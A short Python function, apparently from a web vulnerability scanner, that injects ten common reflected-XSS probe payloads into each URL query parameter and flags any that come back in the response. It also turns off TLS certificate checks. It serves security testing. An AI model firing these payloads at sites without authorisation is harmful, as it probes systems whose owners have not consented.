import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "'-alert(1)-'",
]


def test_xss(url, timeout=5):
    """
    Tests URL parameters for Reflected XSS.
    Returns list of findings.
    """
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return findings

    for param in params:
        for payload in PAYLOADS:
            modified_params = params.copy()
            modified_params[param] = payload

            new_query = urlencode(modified_params, doseq=True)
            new_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                response = requests.get(new_url, timeout=timeout, verify=False)
                if payload in response.text:
                    findings.append({
                        "type": "Reflected XSS",
                        "severity": "Critical 🔴",
                        "param": param,
                        "payload": payload,
                        "url": new_url,
                        "evidence": "Payload reflected in response"
                    })
                    break

            except Exception:
                continue

    return findings
